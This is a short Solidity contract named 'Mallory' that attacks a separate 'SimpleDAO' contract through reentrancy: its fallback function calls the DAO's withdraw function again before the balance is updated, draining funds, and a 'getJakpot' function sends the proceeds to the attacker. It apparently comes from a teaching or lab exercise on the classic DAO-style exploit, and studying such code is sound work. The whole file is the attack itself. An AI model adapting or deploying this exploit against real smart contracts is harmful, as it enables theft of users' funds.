pragma solidity 0.7.6;

import "./SimpleDAO.sol";

contract Mallory {
    SimpleDAO public dao;
    address payable owner;
    constructor(
        address _daoAddress
    ) {
        owner = msg.sender;
        dao = SimpleDAO(_daoAddress);
    }

    fallback() external { dao.withdraw(dao.queryCredit(address(this))); }
    function getJakpot() public { owner.send(address(this).balance); }
}